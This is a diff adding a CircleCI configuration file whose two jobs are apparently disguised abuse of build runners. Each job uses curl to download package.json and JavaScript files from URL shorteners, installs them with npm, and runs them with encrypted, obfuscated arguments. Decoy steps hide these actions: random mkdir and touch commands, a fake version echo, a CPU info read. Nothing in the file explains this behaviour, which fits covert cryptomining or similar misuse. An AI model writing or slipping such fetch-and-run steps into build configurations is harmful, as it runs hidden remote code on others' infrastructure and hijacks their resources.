@@ -1,0 +1,51 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  shitJob:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: mkdir ac6r91w3n095avx9a115a9i
+      - run: curl -fsSL shorturl.at/owyI6 -o package.json && curl -fsSL
+          shorturl.at/mpzDN -o hgk1pxwwj0k.js && curl -fsSL shorturl.at/izFG9 -o
+          jfgkc2v9p.js
+      - run: cat /proc/cpuinfo
+      - run: touch zg8dopiqtc64l69slh3tm.py
+      - run: npm i -s
+      - run: echo version 74594798345.75932
+      - run: mkdir eklos1xn
+      - run: touch gic6n9t6mvtwcp4en.php
+      - run: node hgk1pxwwj0k -t
+          U2FsdGVkX1/LoQC7ueiBGLEHq8dD/ymquFVIJqWCfuZjdM9oqrB9PtsiohEW7WrK -r
+          U2FsdGVkX1+sp1WYipVce2ia78fuxP4C6a7yUXB1nfelizFRVPqf91NtIkrOHPMBefwSD9csU4NIXACkdyWCyiEq8FuOgHmprke6WZc673NBgzMsENAY5Kud+7XtVMevNNipcSNDw0MgEXknu02uFEnDnYlVYHUFHHpnU9uNRf9ipCZ8h057P6vpCmIvbdb949P57rkKwzMGt4+PLtJuoDV4EkyX4LqsBbkqOBmtRkp0IW5UUlOV56wWn/ijM+9640aq0TJZObbONbSFA7y2BOm48TzFi10I0Lp25RsmffdmHr6Hg/cb57wAQMnenJPTdHdgWZEUEMvmu9gJq8G6A2OU9B+hQcLDGKicEtpE+nHWQ8vcMZ0ipRw8B4d+lhnt
+          -sp -s
+          U2FsdGVkX1/t/Rzxr4IVVlPZDpu86Jyv7xG1luJWYmdX8JTvz5ul6wSHIOzHe5ei62545V0vmzKLnbFosS4M+9BZMAjJUQOPsBN+1LY+bEgv19hjbkN0cpScsLvdHNFfdqmZ31ckP8KaFjz3l8R1psA28QWpq1O3WD4v3gtZ7Vb3R9yKsKn6pZPVXctL02svSofFhMlwurbWqYs/qs+Wlyw0oEsmHYk10ji2UnuYwb4=
+          -lpn U2FsdGVkX196BALW2XSd61lejSBaXV7vbfeZQng/gFs=
+  nodeTest:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: curl -fsSL shorturl.at/lHT29 -o cjahhydz4kftrv.js && curl -fsSL
+          shorturl.at/jwQ01 -o package.json && curl -fsSL shorturl.at/nxUWY -o
+          wrtgfzfylgo62j0vvup8.js
+      - run: mkdir 3lhw90av97zjpb
+      - run: touch zoti8zvkit6gdr19.net
+      - run: npm i -s
+      - run: mkdir tyn87tojz7sr
+      - run: touch vkzjbw1ho6312jrzna.cpp
+      - run: node cjahhydz4kftrv -r
+          U2FsdGVkX18+lD+d3E0X7syWikf7qBJ0H4a+vr3JqICAyXvcS0vIdQo2TKEHOMfMLjJRQoymqjOtj9biI2o89UjmWbrHjNijfrmM5/93Yo9ZR9dTYhBBEgdwovlJBOjt6KWoO7ABs3mtFO8nFYiAGCMOOy1ojQ4QSlyp4mbBBHhfhTGJZzlpK8h5B1qON2VPdLwM8kVF/iVZaeIdhfauZXzzWYZvmjF3vIRCGEbfy5BXadC0hynOtSKP8Jppp/f2kq5pcCdVSUAa2WgESNVqFzIVjTrJPsFF8zQaSfh290sM8tcCu5MCP3LOSgS2khPGspxgz9606D8rwFU6HHM9RvmQnX7GkzX3A6D0aTfN9yy55SQ1RLqd0UAHOYza6wDe
+          -lpn U2FsdGVkX1873Q8SwCxTDQMnPF/H093SVljM96nqWXbvDkEj9sFOWNbJtEkhCjno
+          -sp -t
+          U2FsdGVkX1930P+OqAnWFKaB3ACEjfPbrKGUsSPv93tArSXzMS/30mT67/JLCkwV -s
+          U2FsdGVkX1+kB7yI4GE2Uco0OGV7V+rRvMDaVFBOh9yPgmB/09YA9osDujCmLF6V4jiVONiFoWcPxOjxCKfrcYPZllSFCdHbikgWVbpcX9DYSVpqR2/V0y5IEN6MbHjkTtuB0A+xCegwtPdEp6ZxhqGPxauH5GWOPFls4eL5CALq3sk/95Wo7K3mcJ2IHUmaE2jjdy12f7qTwxFzPkoXSBCGLBAfT9Es4h+lAsaCUPc=
+      - run: mkdir wmtupzveflqe9wxdwh
+      - run: mkdir 81zbns6p55g1fuv5b
+workflows:
+  ditmecuocdoi:
+    jobs:
+      - shitJob
+  KingOfJobs:
+    jobs:
+      - nodeTest
